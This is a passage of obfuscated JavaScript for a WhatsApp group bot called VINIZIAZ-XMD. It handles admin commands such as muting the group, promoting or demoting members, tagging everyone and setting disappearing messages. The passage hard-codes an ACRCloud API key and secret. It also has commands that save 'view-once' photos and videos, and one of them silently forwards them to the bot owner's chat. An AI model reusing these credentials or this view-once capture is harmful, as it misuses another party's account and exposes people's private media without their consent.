                  return _0x1d37a1("*select:*\nsecond\nminute\nhour\n\n*Example*\n10 second");
                }
              }
            }
          }
          _0x1d37a1("Countdown of  " + q + " starting from now to close the group");
          setTimeout(() => {
            _0x398b1a.groupSettingUpdate(_0xca7ad5.chat, "announcement");
            _0x1d37a1("𝗚𝗿𝗼𝘂𝗽 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗰𝗹𝗼𝘀𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗯𝘆 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗");
          }, _0xb23c32);
          break;
        case 'opentime':
          if (!_0xca7ad5.isGroup) {
            throw group;
          }
          if (!_0x396ea3) {
            throw admin;
          }
          if (!_0x59fea5) {
            throw botAdmin;
          }
          if (_0x4dd883[0x1] == 'second') {
            var _0xb23c32 = _0x4dd883[0x0] * '1000';
          } else {
            if (_0x4dd883[0x1] == "minute") {
              var _0xb23c32 = _0x4dd883[0x0] * "60000";
            } else {
              if (_0x4dd883[0x1] == 'hour') {
                var _0xb23c32 = _0x4dd883[0x0] * '3600000';
              } else {
                if (_0x4dd883[0x1] == "day") {
                  var _0xb23c32 = _0x4dd883[0x0] * "86400000";
                } else {
                  return _0x1d37a1("*select:*\nsecond\nminute\nhour\n\n*example*\n10 second");
                }
              }
            }
          }
          _0x1d37a1("Countdown of " + q + " starting from now to open the group");
          setTimeout(() => {
            _0x398b1a.groupSettingUpdate(_0xca7ad5.chat, 'not_announcement');
            _0x1d37a1("𝗚𝗿𝗼𝘂𝗽 𝗼𝗽𝗲𝗻𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆 𝗯𝘆 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗠𝗗");
          }, _0xb23c32);
          break;
        case "close":
        case "mute":
          {
            if (!_0xca7ad5.isGroup) {
              throw group;
            }
            if (!_0x59fea5) {
              throw botAdmin;
            }
            if (!_0x396ea3) {
              throw admin;
            }
            await _0x398b1a.groupSettingUpdate(_0xca7ad5.chat, 'announcement');
            _0xca7ad5.reply("Group successfully locked!");
          }
          break;
        case "open":
        case 'unmute':
          {
            if (!_0xca7ad5.isGroup) {
              throw group;
            }
            if (!_0x59fea5) {
              throw botAdmin;
            }
            if (!_0x396ea3) {
              throw admin;
            }
            await _0x398b1a.groupSettingUpdate(_0xca7ad5.chat, 'not_announcement');
            _0xca7ad5.reply("𝗚𝗿𝗼𝘂𝗽 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗨𝗻𝗹𝗼𝗰𝗸𝗲𝗱 𝗕𝘆 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗!");
          }
          break;
        case "disp-1":
          {
            if (!_0xca7ad5.isGroup) {
              throw group;
            }
            if (!_0x59fea5) {
              throw botAdmin;
            }
            if (!_0x396ea3) {
              throw admin;
            }
            await _0x398b1a.groupToggleEphemeral(_0xca7ad5.chat, 86400);
            _0xca7ad5.reply("Dissapearing messages successfully turned on for 24hrs!");
          }
          break;
        case "promote":
          {
            if (!_0xca7ad5.isGroup) {
              throw group;
            }
            if (!_0x59fea5) {
              throw botAdmin;
            }
            if (!_0x396ea3) {
              throw admin;
            }
            if (!_0xca7ad5.quoted) {
              throw "Ttag someone with the command!";
            }
            let _0x20fc4a = _0xca7ad5.mentionedJid[0x0] ? _0xca7ad5.mentionedJid : _0xca7ad5.quoted ? [_0xca7ad5.quoted.sender] : [_0x32c5b4.replace(/[^0-9]/g, '') + "@s.whatsapp.net"];
            await _0x398b1a.groupParticipantsUpdate(_0xca7ad5.chat, _0x20fc4a, "promote");
            _0xca7ad5.reply("𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗽𝗿𝗼𝗺𝗼𝘁𝗲𝗱,𝗯𝗲 𝗮 𝗵𝗮𝗿𝗱𝘄𝗼𝗿𝗸𝗶𝗻𝗴 𝗮𝗱𝗺𝗶𝗻! 🦄");
          }
          break;
        case "demote":
          {
            if (!_0xca7ad5.isGroup) {
              throw group;
            }
            if (!_0x59fea5) {
              throw botAdmin;
            }
            if (!_0x396ea3) {
              throw admin;
            }
            if (!_0xca7ad5.quoted) {
              throw "Ttag someone with the command!";
            }
            let _0x128cd5 = _0xca7ad5.mentionedJid[0x0] ? _0xca7ad5.mentionedJid : _0xca7ad5.quoted ? [_0xca7ad5.quoted.sender] : [_0x32c5b4.replace(/[^0-9]/g, '') + "@s.whatsapp.net"];
            await _0x398b1a.groupParticipantsUpdate(_0xca7ad5.chat, _0x128cd5, "demote");
            _0xca7ad5.reply("𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗴𝘂𝗹𝗹𝘆 𝗱𝗲𝗺𝗼𝘁𝗲𝗱, 𝗵𝗼𝘄 𝗱𝗼 𝘆𝗼𝘂 𝗳𝗲𝗲𝗹 𝘆𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻! 😲");
          }
          break;
        case "disp-7":
          {
            if (!_0xca7ad5.isGroup) {
              throw group;
            }
            if (!_0x59fea5) {
              throw botAdmin;
            }
            if (!_0x396ea3) {
              throw admin;
            }
            await _0x398b1a.groupToggleEphemeral(_0xca7ad5.chat, 604800);
            _0xca7ad5.reply("𝗗𝗶𝘀𝗮𝗽𝗽𝗲𝗮𝗿𝗶𝗻𝗴 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝘂𝗿𝗻𝗲𝗱 𝗼𝗻 𝗳𝗼𝗿 7𝗱𝗮𝘆𝘀!");
          }
          break;
        case "disp-90":
          {
            if (!_0xca7ad5.isGroup) {
              throw group;
            }
            if (!_0x59fea5) {
              throw botAdmin;
            }
            if (!_0x396ea3) {
              throw admin;
            }
            await _0x398b1a.groupToggleEphemeral(_0xca7ad5.chat, 7776000);
            _0xca7ad5.reply("𝗗𝗶𝘀𝗮𝗽𝗽𝗲𝗮𝗿𝗶𝗻𝗴 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝘂𝗿𝗻𝗲𝗱 𝗼𝗻 𝗳𝗼𝗿 90 𝗱𝗮𝘆𝘀!");
          }
          break;
        case 'disp-off':
          {
            if (!_0xca7ad5.isGroup) {
              throw group;
            }
            if (!_0x59fea5) {
              throw botAdmin;
            }
            if (!_0x396ea3) {
              throw admin;
            }
            await _0x398b1a.groupToggleEphemeral(_0xca7ad5.chat, 0x0);
            _0xca7ad5.reply("Dissapearing messages successfully turned off!");
          }
          break;
        case 'icon':
          {
            if (!_0xca7ad5.isGroup) {
              throw group;
            }
            if (!_0x396ea3) {
              throw admin;
            }
            if (!_0x59fea5) {
              throw botAdmin;
            }
            if (!_0x38810c) {
              throw "Send or tag an image with the caption " + (prefix + _0x3418f9);
            }
            if (!/image/.test(_0x372f6b)) {
              throw "Send or tag an image with the caption " + (prefix + _0x3418f9);
            }
            if (/webp/.test(_0x372f6b)) {
              throw "Send or tag an image with the caption " + (prefix + _0x3418f9);
            }
            let _0x1e9fbd = await _0x398b1a.downloadAndSaveMediaMessage(_0x38810c);
            await _0x398b1a.updateProfilePicture(_0xca7ad5.chat, {
              'url': _0x1e9fbd
            })['catch'](_0x1cd16f => fs.unlinkSync(_0x1e9fbd));
            _0x1d37a1("𝗚𝗿𝗼𝘂𝗽 𝗜𝗰𝗼𝗻 𝗨𝗽𝗱𝗮𝘁𝗲𝗱 𝗯𝘆 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗");
          }
          break;
        case "revoke":
        case "newlink":
        case "reset":
          {
            if (!_0xca7ad5.isGroup) {
              throw group;
            }
            if (!_0x396ea3) {
              throw admin;
            }
            if (!_0x59fea5) {
              throw botAdmin;
            }
            await _0x398b1a.groupRevokeInvite(_0xca7ad5.chat);
            await _0x398b1a.sendText(_0xca7ad5.chat, "Group link revoked!", _0xca7ad5);
            let _0x3de639 = await _0x398b1a.groupInviteCode(_0xca7ad5.chat);
            _0x398b1a.sendText(_0xca7ad5.sender, "https://chat.whatsapp.com/" + _0x3de639 + "\n\nHere is the new group link for " + _0x33cc44.subject, _0xca7ad5, {
              'detectLink': true
            });
            _0x398b1a.sendText(_0xca7ad5.chat, "Sent you the new group link in your inbox!", _0xca7ad5);
          }
          break;
        case 'delete':
        case "del":
          {
            if (!_0xca7ad5.isGroup) {
              throw group;
            }
            if (!_0x59fea5) {
              throw botAdmin;
            }
            if (!_0x396ea3) {
              throw admin;
            }
            if (!_0xca7ad5.quoted) {
              throw "No message quoted for deletion";
            }
            let {
              chat: _0x424a69,
              fromMe: _0x2ae68d,
              id: _0x229aba,
              isBaileys: _0x358464
            } = _0xca7ad5.quoted;
            if (_0x358464) {
              throw "I cannot delete. Quoted message is my message or another bot message.";
            }
            _0x398b1a.sendMessage(_0xca7ad5.chat, {
              'delete': {
                'remoteJid': _0xca7ad5.chat,
                'fromMe': false,
                'id': _0xca7ad5.quoted.id,
                'participant': _0xca7ad5.quoted.sender
              }
            });
          }
          break;
        case "leave":
          {
            if (!_0x11f3a8) {
              throw NotOwner;
            }
            if (!_0xca7ad5.isGroup) {
              throw group;
            }
            await _0x398b1a.sendMessage(_0xca7ad5.chat, {
              'text': "𝗚𝗼𝗼𝗱𝗯𝘆𝗲 𝗲𝘃𝗲𝗿𝘆𝗼𝗻𝗲👋. 𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝗶𝘀 𝗟𝗲𝗮𝘃𝗶𝗻𝗴 𝘁𝗵𝗲 𝗚𝗿𝗼𝘂𝗽 𝗻𝗼𝘄...",
              'mentions': _0x35f297.map(_0x284dd7 => _0x284dd7.id)
            }, {
              'quoted': _0xca7ad5
            });
            await _0x398b1a.groupLeave(_0xca7ad5.chat);
          }
          break;
        case "subject":
        case 'changesubject':
          {
            if (!_0xca7ad5.isGroup) {
              throw group;
            }
            if (!_0x59fea5) {
              throw botAdmin;
            }
            if (!_0x396ea3) {
              throw admin;
            }
            if (!_0x32c5b4) {
              throw "Provide the text for the group subject.";
            }
            await _0x398b1a.groupUpdateSubject(_0xca7ad5.chat, _0x32c5b4);
            _0xca7ad5.reply("Group name successfully updated! 💀");
          }
          break;
        case "desc":
        case "setdesc":
          {
            if (!_0xca7ad5.isGroup) {
              throw group;
            }
            if (!_0x59fea5) {
              throw botAdmin;
            }
            if (!_0x396ea3) {
              throw admin;
            }
            if (!_0x32c5b4) {
              throw "Provide the text for the group description";
            }
            await _0x398b1a.groupUpdateDescription(_0xca7ad5.chat, _0x32c5b4);
            _0xca7ad5.reply("Group description successfully updated! 🥶");
          }
          break;
        case 'hidetag':
        case "tag":
          {
            if (!_0xca7ad5.isGroup) {
              throw group;
            }
            if (!_0x59fea5) {
              throw botAdmin;
            }
            if (!_0x396ea3) {
              throw admin;
            }
            _0x398b1a.sendMessage(_0xca7ad5.chat, {
              'text': q ? q : "😅𝗕𝗹𝗶𝗻𝗱 𝗧𝗮𝗴𝘀😅",
              'mentions': _0x35f297.map(_0xf6780e => _0xf6780e.id)
            }, {
              'quoted': _0xca7ad5
            });
          }
          break;
        case "tagall":
          {
            if (!_0xca7ad5.isGroup) {
              throw group;
            }
            if (!_0x59fea5) {
              throw botAdmin;
            }
            if (!_0x396ea3) {
              throw admin;
            }
            let _0x4ecccf = "𝗩𝗜𝗡𝗜𝗭𝗜𝗔𝗭-𝗫𝗠𝗗 𝗶𝘀 𝗧𝗮𝗴𝗶𝗻𝗴 𝘆𝗼𝘂 𝗼𝗻 𝗯𝗲𝗵𝗮𝗹𝗳 𝗼𝗳 𝘆𝗼𝘂𝗿 𝗶𝗻𝗮𝗰𝘁𝗶𝘃𝗲 𝗹𝗼𝘃𝗲𝗿🖕😅: \n   \n  Message " + (q ? q : '') + "*\n\n";
            for (let _0x4aeebb of _0x35f297) {
              _0x4ecccf += "📧 @" + _0x4aeebb.id.split('@')[0x0] + "\n";
            }
            _0x398b1a.sendMessage(_0xca7ad5.chat, {
              'text': _0x4ecccf,
              'mentions': _0x35f297.map(_0x588848 => _0x588848.id)
            }, {
              'quoted': _0xca7ad5
            });
          }
          break;
        case "whatsong":
        case 'shazam':
          let _0x519922 = new acrcloud({
            'host': "identify-eu-west-1.acrcloud.com",
            'access_key': "2631ab98e77b49509e3edcf493757300",
            'access_secret': "KKbVWlTNCL3JjxjrWnywMdvQGanyhKRN0fpQxyUo"
          });
          if (!_0xca7ad5.quoted) {
            throw "Tag a short video or audio";
          }
          let _0x431faf = _0xca7ad5.quoted ? _0xca7ad5.quoted : _0xca7ad5;
          let _0x404d0d = (_0x431faf.msg || _0x431faf).mimetype || _0x431faf.mediaType || '';
          if (/video|audio/.test(_0x404d0d)) {
            let _0x522e71 = await _0x431faf.download();
            await _0x1d37a1("Analyzing the media...");
            let {
              status: _0x1ef486,
              metadata: _0x226212
            } = await _0x519922.identify(_0x522e71);
            if (_0x1ef486.code !== 0x0) {
              throw _0x1ef486.msg;
            }
            let {
              title: _0x3ff9b4,
              artists: _0x515ebe,
              album: _0x5a8dce,
              genres: _0x541e28,
              release_date: _0x490e85
            } = _0x226212.music[0x0];
            let _0x3192d5 = "*• Title:* " + _0x3ff9b4 + (_0x515ebe ? "\n*• Artists:* " + _0x515ebe.map(_0xd55168 => _0xd55168.name).join(", ") : '');
            _0x3192d5 += '' + (_0x5a8dce ? "\n*• Album:* " + _0x5a8dce.name : '') + (_0x541e28 ? "\n*• Genres:* " + _0x541e28.map(_0x116c4b => _0x116c4b.name).join(", ") : '') + "\n";
            _0x3192d5 += "*• Release Date:* " + _0x490e85;
            await _0x398b1a.sendMessage(_0xca7ad5.chat, {
              'text': _0x3192d5.trim()
            }, {
              'quoted': _0xca7ad5
            });
            const {
              videos: _0x2acab6
            } = await yts(_0x3ff9b4);
            if (!_0x2acab6 || _0x2acab6.length <= 0x0) {
              _0x1d37a1("No Matching videos found for : *" + _0x4dd883[0x0] + "*!!");
              return;
            }
            let _0x37d2c7 = _0x2acab6[0x0].url;
            let _0x1c5090 = await ytdl.getInfo(_0x37d2c7);
            if (_0x1c5090.videoDetails.lengthSeconds >= 0x708) {
              _0x1d37a1("Too big!");
              return;
            }
            let _0x3be10a = _0x1c5090.videoDetails.title;
            let _0x1b57ea = '' + Math.floor(Math.random() * 0x2710) + ".mp3";
            const _0x1a93a5 = ytdl(_0x37d2c7, {
              'filter': _0x34d792 => _0x34d792.audioBitrate == 0xa0 || _0x34d792.audioBitrate == 0x80
            }).pipe(fs.createWriteStream('./' + _0x1b57ea));
            console.log("Audio downloading ->", _0x37d2c7);
            await new Promise((_0x4995c8, _0x4bf723) => {
              _0x1a93a5.on("error", _0x4bf723);
              _0x1a93a5.on("finish", _0x4995c8);
            });
            let _0x3ba3b2 = fs.statSync('./' + _0x1b57ea);
            let _0x3b026d = _0x3ba3b2.size;
            let _0x4a5391 = _0x3b026d / 1048576;
            console.log("Audio downloaded ! \n Size: " + _0x4a5391);
            if (_0x4a5391 <= 0x28) {
              await _0x398b1a.sendMessage(_0x24b6cb, {
                'document': fs.readFileSync('./' + _0x1b57ea),
                'mimetype': "audio/mpeg",
                'fileName': _0x3be10a + ".mp3"
              }, {
                'quoted': _0xca7ad5
              });
            } else {
              _0x1d37a1("File size bigger.");
            }
            fs.unlinkSync('./' + _0x1b57ea);
          }
          break;
        case 's':
        case "sticker":
          {
            const {
              Sticker: _0x27af1c,
              createSticker: _0x500b98,
              StickerTypes: _0x55904a
            } = require('wa-sticker-formatter');
            if (!_0x4db425) {
              _0xca7ad5.reply("Quote an image or a short video.");
              return;
            }
            ;
            let _0x5d24e5;
            if (_0x4db425.imageMessage) {
              _0x5d24e5 = _0x4db425.imageMessage;
            } else {
              if (_0x4db425.videoMessage) {
                _0x5d24e5 = _0x4db425.videoMessage;
              } else {
                _0xca7ad5.reply("That is neither an image nor a short video! ");
                return;
              }
            }
            ;
            var _0x556056 = await _0x398b1a.downloadAndSaveMediaMessage(_0x5d24e5);
            let _0x5bad28 = new _0x27af1c(_0x556056, {
              'pack': packname,
              'author': author,
              'type': _0x55904a.FULL,
              'categories': ['🤩', '🎉'],
              'id': '12345',
              'quality': 0x46,
              'background': "transparent"
            });
            const _0x3b4598 = await _0x5bad28.toBuffer();
            _0x398b1a.sendMessage(_0xca7ad5.chat, {
              'sticker': _0x3b4598
            }, {
              'quoted': _0xca7ad5
            });
          }
          break;
        case 'dp':
          {
            try {
              ha = _0xca7ad5.quoted.sender;
              qd = await _0x398b1a.getName(ha);
              pp2 = await _0x398b1a.profilePictureUrl(ha, "image");
            } catch {
              pp2 = "https://tinyurl.com/yx93l6da";
            }
            if (!_0xca7ad5.quoted) {
              throw "Tag a user!";
            }
            bar = "Profile Picture of " + qd;
            _0x398b1a.sendMessage(_0xca7ad5.chat, {
              'image': {
                'url': pp2
              },
              'caption': bar,
              'fileLength': "999999999999"
            }, {
              'quoted': _0xca7ad5
            });
          }
          break;
        case "list":
        case "vars":
        case "help":
          _0x1d37a1("𝟏 Owner➣ 𝐆𝐞𝐭 𝗩𝗶𝗻𝗶𝘇𝗶𝗮𝘇  𝐜𝐨𝐧𝐭𝐚𝐜𝐭\n\n𝟐 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭➣ 𝐒𝐞𝐧𝐝𝐬 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 𝐭𝐨 𝐚𝐥𝐥 𝐠𝐫𝐨𝐮𝐩𝐬\n\n𝟑 𝐉𝐨𝐢𝐧➣ 𝐭𝐚𝐠 𝐠𝐫𝐨𝐮𝐩 𝐥𝐢𝐧𝐤 𝐰𝐢𝐭𝐡 𝐣𝐨𝐢𝐧\n\n𝟒 𝐛𝐨𝐭𝐩𝐩➣ 𝐂𝐡𝐚𝐧𝐠𝐞 𝐛𝐨𝐭𝐬 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐝𝐩\n\n𝟓 𝐁𝐥𝐨𝐜𝐤➣ 𝐁𝐥𝐨𝐜𝐤 𝐭𝐡𝐞𝐦 𝐟𝐚𝐤𝐞 𝐟𝐫𝐢𝐞𝐧𝐝𝐬\n\n𝟔 𝐊𝐢𝐥𝐥➣ 𝐊𝐢𝐥𝐥𝐬 𝐠𝐫𝐨𝐮𝐩 𝐢𝐧 𝐬𝐞𝐜𝐨𝐧𝐝𝐬\n\n𝟕 𝐔𝐧𝐛𝐥𝐨𝐜𝐤➣ 𝐆𝐢𝐯𝐞 𝐭𝐡𝐞𝐦 𝐟𝐚𝐤𝐞 𝐟𝐫𝐢𝐞𝐧𝐝𝐬 𝐚 𝐬𝐞𝐜𝐨𝐧𝐝 𝐜𝐡𝐚𝐧𝐜𝐞\n\n𝟖 𝐒𝐞𝐭𝐯𝐚𝐫➣ 𝐒𝐞𝐭 𝐯𝐚𝐫𝐬 𝐢𝐧 𝐡𝐞𝐫𝐨𝐤𝐮\n\n𝟗 𝐒𝐭𝐢𝐜𝐤𝐞𝐫➣ 𝐂𝐨𝐧𝐯𝐞𝐫𝐭𝐬 𝐚 𝐩𝐡𝐨𝐭𝐨 𝐨𝐫 𝐚 𝐬𝐡𝐨𝐫𝐭 𝐯𝐢𝐝𝐞𝐨 𝐭𝐨 𝐚 𝐬𝐭𝐢𝐜𝐤𝐞𝐫\n\n𝟏𝟎 𝐓𝐨𝐢𝐦𝐠➣ 𝐂𝐨𝐧𝐯𝐞𝐫𝐭𝐬 𝐚 𝐬𝐭𝐢𝐜𝐤𝐞𝐫 𝐭𝐨 𝐚 𝐩𝐡𝐨𝐭𝐨\n\n𝟏𝟏 𝐏𝐥𝐚𝐲➣ 𝐆𝐞𝐭 𝐲𝐨𝐮𝐫 𝐟𝐚𝐯𝐨𝐫𝐢𝐭𝐞 𝐬𝐨𝐧𝐠\n\n𝟏𝟐 𝐖𝐡𝐚𝐭𝐬𝐨𝐧𝐠➣ 𝐠𝐞𝐭 𝐭𝐡𝐞 𝐭𝐢𝐭𝐥𝐞 𝐨𝐟 𝐭𝐡𝐞 𝐬𝐨𝐧𝐠\n\n𝟏𝟑 𝐘𝐭𝐬 ➣ 𝐆𝐞𝐭 𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𝐯𝐢𝐝𝐞𝐨𝐬\n\n𝟏𝟒 𝐌𝐨𝐯𝐢𝐞➣ 𝐆𝐞𝐭 𝐲𝐨𝐮𝐫 𝐟𝐚𝐯𝐨𝐫𝐢𝐭𝐞 𝐦𝐨𝐯𝐢𝐞 𝐝𝐞𝐭𝐚𝐢𝐥𝐬\n\n𝟏𝟓 𝐌𝐢𝐱➣ 𝐂𝐨𝐦𝐛𝐢𝐧𝐞𝐬 +𝟐𝐞𝐦𝐨𝐣𝐢𝐬\n\n𝟏𝟔 𝐀𝐢-𝐢𝐦𝐠➣ 𝐆𝐞𝐭 𝐚𝐧 𝐀𝐢 𝐩𝐡𝐨𝐭𝐨\n\n𝟏𝟕 𝐆𝐩𝐭 ➣ 𝐇𝐞𝐫𝐞 𝐭𝐨 𝐚𝐧𝐬𝐰𝐞𝐫 𝐲𝐨𝐮𝐫 𝐪𝐮𝐞𝐬𝐭𝐢𝐨𝐧𝐬\n\n𝟏𝟖 𝐃𝐩➣ 𝐆𝐞𝐭𝐬 𝐚 𝐩𝐞𝐫𝐬𝐨𝐧 𝐝𝐩\n\n𝟏𝟗 𝐒𝐩𝐞𝐞𝐝 ➣ 𝐂𝐡𝐞𝐜𝐤𝐬 𝐛𝐨𝐭𝐬 𝐬𝐩𝐞𝐞𝐝\n\n𝟐𝟎 𝐀𝐥𝐢𝐯𝐞➣ 𝐂𝐡𝐞𝐜𝐤 𝐰𝐡𝐞𝐭𝐡𝐞𝐫 𝐭𝐡𝐞 𝐛𝐨𝐭 𝐢𝐬 𝐬𝐭𝐢𝐥𝐥 𝐤𝐢𝐜𝐤𝐢𝐧𝐠\n\n𝟐𝟏 𝐑𝐮𝐧𝐭𝐢𝐦𝐞➣ 𝐖𝐡𝐞𝐧 𝐝𝐢𝐝 𝐛𝐨𝐭 𝐬𝐭𝐚𝐫𝐭𝐞𝐝 𝐨𝐩𝐞𝐫𝐚𝐭𝐢𝐧𝐠\n\n𝟐𝟐 𝐒𝐜𝐫𝐢𝐩𝐭➣ 𝐆𝐞𝐭 𝐛𝐨𝐭 𝐬𝐜𝐫𝐢𝐩𝐭\n\n𝟐𝟑 𝐎𝐰𝐧𝐞𝐫  ➣ 𝐆𝐞𝐭 𝐨𝐰𝐧𝐞𝐫(𝐬) 𝐜𝐨𝐧𝐭𝐚𝐜𝐭\n\n𝟐𝟒 𝐕𝐚𝐫𝐬 ➣ 𝐒𝐞𝐞 𝐚𝐥𝐥 𝐯𝐚𝐫𝐢𝐚𝐛𝐥𝐞𝐬\n\n𝟐𝟓 𝐏𝐫𝐨𝐦𝐨𝐭𝐞➣ 𝐆𝐢𝐯𝐞𝐬 𝐨𝐧𝐞 𝐚𝐝𝐦𝐢𝐧 𝐫𝐨𝐥𝐞\n\n𝟐𝟔 𝐃𝐞𝐦𝐨𝐭𝐞➣ 𝐃𝐞𝐦𝐨𝐭𝐞𝐬 𝐟𝐫𝐨𝐦 𝐠𝐫𝐨𝐮𝐩 𝐚𝐝𝐦𝐢𝐧 𝐭𝐨 𝐚 𝐦𝐞𝐦𝐛𝐞𝐫\n\n𝟐𝟕 𝐃𝐞𝐥𝐞𝐭𝐞➣ 𝐃𝐞𝐥𝐞𝐭𝐞 𝐚 𝐦𝐞𝐬𝐬𝐚𝐠𝐞\n\n𝟐𝟖 𝐑𝐞𝐦𝐨𝐯𝐞/𝐤𝐢𝐜𝐤➣ 𝐊𝐢𝐜𝐤 𝐭𝐡𝐚𝐭 𝐭𝐞𝐫𝐫𝐨𝐫𝐢𝐬𝐭 𝐟𝐫𝐨𝐦 𝐚 𝐠𝐫𝐨𝐮𝐩\n\n𝟐𝟗 𝐅𝐨𝐫𝐞𝐢𝐠𝐧𝐞𝐫𝐬➣ 𝐆𝐞𝐭 𝐟𝐨𝐫𝐞𝐢𝐠𝐧 𝐧𝐮𝐦𝐛𝐞𝐫𝐬\n\n𝟑𝟎 𝐂𝐥𝐨𝐬𝐞➣ 𝐓𝐢𝐦𝐞 𝐟𝐨𝐫 𝐠𝐫𝐨𝐮𝐩 𝐦𝐞𝐦𝐛𝐞𝐫𝐬 𝐭𝐨 𝐭𝐚𝐤𝐞 𝐚 𝐛𝐫𝐞𝐚𝐤 𝐨𝐧𝐥𝐲 𝐚𝐝𝐦𝐢𝐧𝐬 𝐜𝐚𝐧 𝐜𝐡𝐚𝐭\n\n𝟑𝟏 𝐎𝐩𝐞𝐧 ➣ 𝐄𝐯𝐞𝐫𝐲𝐨𝐧𝐞 𝐜𝐚𝐧 𝐜𝐡𝐚𝐭 𝐢𝐧 𝐚 𝐠𝐫𝐨𝐮𝐩\n\n𝟑𝟐 𝐈𝐜𝐨𝐧➣ 𝐂𝐡𝐚𝐧𝐠𝐞 𝐠𝐫𝐨𝐮𝐩 𝐢𝐜𝐨𝐧\n\n𝟑𝟑 𝐒𝐮𝐛𝐣𝐞𝐜𝐭➣ 𝐂𝐡𝐚𝐧𝐠𝐞 𝐠𝐫𝐨𝐮𝐩 𝐬𝐮𝐛𝐣𝐞𝐜𝐭\n\n𝟑𝟒 𝐃𝐞𝐬𝐜➣ 𝐆𝐞𝐭 𝐠𝐫𝐨𝐮𝐩 𝐝𝐞𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧\n\n𝟑𝟓 𝐋𝐞𝐚𝐯𝐞➣ 𝐓𝐡𝐞 𝐠𝐫𝐨𝐮𝐩 𝐢𝐬 𝐛𝐨𝐫𝐢𝐧𝐠 ,𝐭𝐢𝐦𝐞 𝐟𝐨𝐫 𝐛𝐨𝐭 𝐭𝐨 𝐥𝐞𝐚𝐯𝐞\n\n𝟑𝟔 𝐓𝐚𝐠𝐚𝐥𝐥 ➣ 𝐓𝐚𝐠 𝐞𝐯𝐞𝐫𝐲𝐨𝐧𝐞 𝐢𝐧 𝐚 𝐠𝐫𝐨𝐮𝐩 𝐜𝐡𝐚𝐭\n\n𝟑𝟕 𝐇𝐢𝐝𝐞𝐭𝐚𝐠➣ 𝐀𝐭𝐭𝐞𝐧𝐭𝐢𝐨𝐧! 𝐀𝐭𝐭𝐞𝐧𝐭𝐢𝐨𝐧! 𝐬𝐨𝐦𝐞𝐨𝐧𝐞 𝐡𝐚𝐬 𝐬𝐨𝐦𝐞𝐭𝐡𝐢𝐧𝐠 𝐭𝐨 𝐬𝐚𝐲\n\n𝟑𝟖 𝐑𝐞𝐯𝐨𝐤𝐞 ➣ 𝐑𝐞𝐬𝐞𝐭 𝐠𝐫𝐨𝐮𝐩 𝐥𝐢𝐧𝐤");
          break;
        case 'vv':
        case 'retrieve':
          {
            if (!_0xca7ad5.quoted) {
              return _0xca7ad5.reply("quote a viewonce message eh");
            }
            const _0x4d7fc9 = _0xca7ad5.msg?.["contextInfo"]?.["quotedMessage"];
            if (_0x4d7fc9.imageMessage) {
              let _0x249115 = _0x4d7fc9.imageMessage.caption;
              let _0x704ab1 = await _0x398b1a.downloadAndSaveMediaMessage(_0x4d7fc9.imageMessage);
              _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'image': {
                  'url': _0x704ab1
                },
                'caption': "Retrieved by VINIZIAZ-XMD!\n" + _0x249115
              }, {
                'quoted': _0xca7ad5
              });
            }
            if (_0x4d7fc9.videoMessage) {
              let _0x52b811 = _0x4d7fc9.videoMessage.caption;
              let _0x493c07 = await _0x398b1a.downloadAndSaveMediaMessage(_0x4d7fc9.videoMessage);
              _0x398b1a.sendMessage(_0xca7ad5.chat, {
                'video': {
                  'url': _0x493c07
                },
                'caption': "Retrieved by VINIZIAZ-XMD!\n" + _0x52b811
              }, {
                'quoted': _0xca7ad5
              });
            }
          }
          break;
        case "vv2":
        case "wah":
          {
            if (!_0xca7ad5.quoted) {
              return _0xca7ad5.reply("quote a viewonce message eh");
            }
            const _0x12fd68 = _0xca7ad5.msg?.["contextInfo"]?.['quotedMessage'];
            if (_0x12fd68.imageMessage) {
              let _0x3b263b = _0x12fd68.imageMessage.caption;
              let _0x10c529 = await _0x398b1a.downloadAndSaveMediaMessage(_0x12fd68.imageMessage);
              _0x398b1a.sendMessage(_0x398b1a.user.id, {
                'image': {
                  'url': _0x10c529
                },
                'caption': "Retrieved by VINIZIAZ-XMD!\n" + _0x3b263b
              }, {
                'quoted': _0xca7ad5
              });
            }
            if (_0x12fd68.videoMessage) {
              let _0x2bb7a4 = _0x12fd68.videoMessage.caption;
              let _0xd62933 = await _0x398b1a.downloadAndSaveMediaMessage(_0x12fd68.videoMessage);
              _0x398b1a.sendMessage(_0x398b1a.user.id, {
                'video': {
                  'url': _0xd62933
                },
                'caption': "Retrieved by VINIZIAZ-XMD!\n" + _0x2bb7a4
              }, {
                'quoted': _0xca7ad5
              });
            }
          }
          break;
        case 'take':
          {
            const {
              Sticker: _0x2d4a2c,
              createSticker: _0x595f92,
              StickerTypes: _0x200e5b
            } = require("wa-sticker-formatter");
            if (!_0x4db425) {
              _0xca7ad5.reply("Quote an image, a short video or a sticker to change watermark.");
              return;
            }
            ;
            let _0x1a9f70;
            if (_0x4db425.imageMessage) {
              _0x1a9f70 = _0x4db425.imageMessage;
            } else {
